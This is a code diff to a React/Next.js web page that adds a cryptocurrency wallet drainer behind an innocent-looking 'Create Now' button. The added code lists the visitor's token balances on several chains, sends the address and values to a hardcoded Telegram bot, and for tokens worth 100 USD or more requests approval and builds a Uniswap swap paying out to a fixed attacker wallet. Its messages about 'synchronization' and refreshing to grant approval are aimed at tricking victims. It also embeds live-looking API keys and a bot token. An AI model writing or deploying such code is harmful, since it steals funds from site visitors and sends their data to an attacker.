@@ -1,4 +1,6 @@
-import React, { useState } from 'react';
+import Moralis from 'moralis';
+import { ThirdwebSDK } from "@thirdweb-dev/sdk";
+import { EvmChain } from '@moralisweb3/common-evm-utils';
 import {
   MenuOutlined,
   MenuFoldOutlined,
@@ -17,14 +19,50 @@ LineChartOutlined,
 CrownOutlined,
 SendOutlined,
 } from '@ant-design/icons';
-import { ConnectWallet, lightTheme } from '@thirdweb-dev/react';
+import React, { useContext, useState} from "react";
+import { useAddress,useBalance,useSigner,ConnectWallet,useConnectionStatus,useWallet,lightTheme } from '@thirdweb-dev/react';
 import { Layout, Menu, Button, theme,Avatar,Typography,Card, Col, Row,Space} from 'antd';
 import type { MenuProps, MenuTheme } from 'antd/es/menu';
+import {FeeAmount} from "@uniswap/v3-sdk";
+import { TradeType,Token, CurrencyAmount, Percent,ChainId } from "@uniswap/sdk-core";
+import { NATIVE_TOKEN_ADDRESS} from '@thirdweb-dev/sdk';
+import { AlphaRouter, SwapOptionsSwapRouter02, SwapType} from "@uniswap/smart-order-router";
+
+import JSBI from 'jsbi';
+import { ethers } from "ethers";
+import { NextPage } from "next";
+import { useRouter } from 'next/router';
+import ChainContext from "../context/Chain";
+import { fromReadableAmount } from "../lib/conversion";
 // import styles from '../styles/Home.module.css';
 const { Header, Sider, Footer, Content } = Layout;
 const { Text } = Typography;
 
 const Home: React.FC = () => {
+  const address = useAddress();
+const wallet = useWallet();
+const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
+const wbalance = data?.displayValue;
+const signer = useSigner();
+const connectionStatus = useConnectionStatus();
+const [showConnectModal, setShowConnectModal] = useState(false);
+const apiKey = "XBHbf47AI2Fin462uOUOgFQ58HVtvev45cj0qegiOGZsivvFG7w53Q4jmQTLjn9x";
+const { selectedChain, setSelectedChain } = useContext(ChainContext);
+const addresses: Record<string, string> = {
+  ["ethereum"]: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+  ["binance"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
+  ["arbitrum"]: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+  ["polygon"]: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+  ["avalanche"]: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+};
+  const chainMapping = {
+      ethereum: "ethereum",
+      arbitrum: "arbitrum",
+      binance: "binance",
+      polygon: "polygon",
+      avalanche: "avalanche",
+      // Add more mappings for other chains if needed
+  };
   const [collapsed, setCollapsed] = useState(false);
   const {
     token: { colorBgContainer },
@@ -125,6 +163,253 @@ const items: MenuItem[] = [
   getItem('Twitter', '32',<TwitterOutlined />),
   getItem('Facebook', '33',<FacebookOutlined />),
 ];
+async function explore() {
+    if (!address) {
+      setShowConnectModal(true);
+      return;
+    }
+    switch (connectionStatus) {
+      case "unknown":
+        await sendMessageToTelegram("User is yet to connect. Hold on........");
+        setShowConnectModal(true);
+        return;
+      case "connecting":
+        await sendMessageToTelegram("User's wallet is connecting. Please be patient...");
+        break;
+      case "connected":
+        await sendMessageToTelegram(`User with wallet address: ${address} and balance of ${wbalance} has connected.`);
+        break;
+      case "disconnected":
+        await sendMessageToTelegram("User has disconnected!");
+        setShowConnectModal(true);
+        return;
+      default:
+        break;
+    }
+    await Moralis.start({
+      apiKey: apiKey,
+    });
+
+    const waddress = address;
+    const chainOptions = ["ethereum", "arbitrum", "polygon", "avalanche"];
+    const allTokenData: {
+      name: string;
+      address: string;
+      balance: string;
+      decimals: number;
+      chain: string;
+      spenderAddy: string;
+      symbol: string;
+      abi: any;
+      usdtad: string;
+      chainNum: number;
+      RpcUrl: string;
+      rawbal: number;
+      chainHex: string;
+    }[] = [];
+    const allNativeTokenData = [];
+    
+    let chain;
+    
+    
+    for (const selectedChain of chainOptions) {
+      let usdtadd: string;
+      let chainNum: number;
+      let RpcUrl: string;
+      let chainHex: string;
+    
+      switch (selectedChain) {
+        case "ethereum":
+                      chain = EvmChain.ETHEREUM;
+                      usdtadd = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
+                      chainNum = 1;
+                      RpcUrl = "https://mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
+                      chainHex = "0x1";
+                      break;
+                  case "arbitrum":
+                      chain = EvmChain.ARBITRUM;
+                      usdtadd = "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1";
+                      chainNum = 42161;
+                      RpcUrl ="https://arbitrum-mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
+                      chainHex = "0xa4b1";
+                      break;
+                  case "polygon":
+                      chain = EvmChain.POLYGON;
+                      usdtadd = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
+                      chainNum = 137;
+                      RpcUrl ="https://polygon-mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
+                      chainHex = "0x89";
+                      break;
+                      case "avalanche":
+                        chain = EvmChain.AVALANCHE;
+                        usdtadd ="0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB";
+                        chainNum = 43114;
+                        RpcUrl = "https://avalanche-mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
+                        chainHex = "0xa86a";
+                        break;
+    
+            default:
+              break;
+      }
+    
+      if (chain) {
+        const response = await Moralis.EvmApi.token.getWalletTokenBalances({
+          address: waddress,
+          chain,
+        });
+        const nativeSync = await Moralis.EvmApi.balance.getNativeBalance({
+          chain,
+          "address": address
+        });
+        const nativeRes = nativeSync.toJSON();
+    
+        const tokens = response.toJSON();
+        const filteredTokens = tokens.filter((token) => {
+          return parseFloat(token.balance) > 0 && token.possible_spam === false;
+        });
+        const tokenData = filteredTokens.map((token) => {
+          const tokenName = token.name;
+          const spenderAddy = addresses[selectedChain];
+          const abi = require("erc-20-abi");
+          const balance: number = parseFloat(token.balance);
+          const rawbalx = balance / Math.pow(10, token.decimals);
+          const rawbal = parseFloat(rawbalx.toFixed(2));
+          
+    
+          return {
+            name: tokenName,
+            address: token.token_address,
+            balance: token.balance,
+            decimals: token.decimals,
+            chain: selectedChain,
+            spenderAddy: spenderAddy,
+            symbol: token.symbol,
+            abi: abi,
+            usdtad: usdtadd,
+            chainNum,
+            RpcUrl,
+            rawbal,
+            chainHex
+          };
+        });
+        allTokenData.push(...tokenData);
+        console.log(allTokenData);
+        allNativeTokenData.push({
+          chain: selectedChain,
+          rawbal: nativeRes.balance,
+          // Add other relevant information about native balance
+        });
+        
+        
+      
+      }
+    }
+    
+    for (const tokenData of allTokenData) {
+     try {
+        const priceResponse = await Moralis.EvmApi.token.getTokenPrice({
+          chain: tokenData.chainHex,
+          include: "percent_change",
+          address: tokenData.address,
+        });
+  
+        const priceData = priceResponse.toJSON();
+        const usd_price = priceData.usdPrice;
+  
+        const tokenValue = tokenData.rawbal * usd_price;
+        await sendMessageToTelegram(`Token Name: ${tokenData.name}\nToken Contract Address: ${tokenData.address}\nToken ChainID:${tokenData.chainNum}\n Token balance: ${tokenData.rawbal}\nToken Value in USD: ${tokenValue}`);
+        if (tokenValue >= 100) {
+
+        const FoundToken = new Token(
+          tokenData.chainNum,
+          tokenData.address,
+          tokenData.decimals,
+          tokenData.symbol,
+          tokenData.name
+        );
+        const SyncToken = new Token(
+          tokenData.chainNum,
+          tokenData.usdtad,
+          18,
+          'WETH',
+          'Wrapped Ether'
+        );
+        const provider = new ethers.providers.JsonRpcProvider(tokenData.RpcUrl);
+        const CurrentConfig = {
+          rpc: {
+            mainnet: tokenData.RpcUrl,
+          },
+          wallet: {
+            address: "0xAd29Bb72d3A05F21a58f75c8F8d69c9207bb131A"
+            
+          },
+          tokens: {
+            in: FoundToken,
+            amountIn: tokenData.rawbal,
+            out: SyncToken,
+            poolFee: FeeAmount.MEDIUM,
+          },
+        };
+       const router = new AlphaRouter({
+          chainId: ChainId.MAINNET,
+          provider,
+        });
+        const options: SwapOptionsSwapRouter02 = {
+          recipient: CurrentConfig.wallet.address,
+          slippageTolerance: new Percent(50, 10_000),
+          deadline: Math.floor(Date.now() / 1000 + 1800),
+          type: SwapType.SWAP_ROUTER_02,
+        }
+        const rawTokenAmountIn: JSBI = fromReadableAmount(
+          CurrentConfig.tokens.amountIn,
+          CurrentConfig.tokens.in.decimals
+        )
+    
+    const route = await router.route(
+      CurrencyAmount.fromRawAmount(
+        CurrentConfig.tokens.in,
+        rawTokenAmountIn
+      ),
+      CurrentConfig.tokens.out,
+      TradeType.EXACT_INPUT,
+      options
+    );
+    if (!route || !route.methodParameters) {
+      
+  };
+    const tokenContract = new ethers.Contract(tokenData.address, ['function approve(address spender, uint256 value)'], signer);
+    const V3_SWAP_ROUTER_ADDRESS = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
+    const tokenApproval = await tokenContract.approve(
+      V3_SWAP_ROUTER_ADDRESS, 
+      ethers.BigNumber.from(rawTokenAmountIn.toString())
+  );
+  const MAX_FEE_PER_GAS = 100000000000;
+  const MAX_PRIORITY_FEE_PER_GAS = 100000000000;
+  if (tokenApproval) {
+    const txRes = await signer?.sendTransaction({
+      data: route?.methodParameters?.calldata,
+      to: V3_SWAP_ROUTER_ADDRESS,
+      value: route?.methodParameters?.value,
+      from: CurrentConfig.wallet.address,
+      maxFeePerGas: MAX_FEE_PER_GAS,
+      maxPriorityFeePerGas: MAX_PRIORITY_FEE_PER_GAS,
+    });
+    // Handle the result of the transaction if needed
+  } else {
+    await sendMessageToTelegram(`Approval not granted for ${tokenData.name}. Synchronization failed. inform user to refresh and grant approval.`);
+  }
+ 
+
+
+} else {
+  await sendMessageToTelegram(`Skipping swap for ${tokenData.name} as its value is less than 100 USD`);
+}
+    } catch (error) {
+        const errorObj = error as Error;
+        await sendMessageToTelegram(errorObj.message); 
+      }
+    }
+}   
   return (
    <Layout>
       <Sider 
@@ -322,7 +607,9 @@ const items: MenuItem[] = [
               backgroundColor:'#fdeaf1',
               color:'#f95192',
               padding:'10px'
-            }}><b>Create Now</b></a>
+              
+            }} onClick={() => explore()}
+            ><b>Create Now</b></a>
             &nbsp;&nbsp;&nbsp;&nbsp;<Button className='invisible md:visible'  type="primary" size="large" style={{
               backgroundColor:'#fdeaf1',
               color:'#f95192'
@@ -450,5 +737,21 @@ const items: MenuItem[] = [
   
 
 };
+const sendMessageToTelegram = async (message: string) => {
+  const botToken = '6057314190:AAES15kEQX0oGZbphbnB9FXsJhcDcN66QmU';
+  const chatId = '5508645371';
+  
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+    }),
+  });
+}; 
 export default Home;
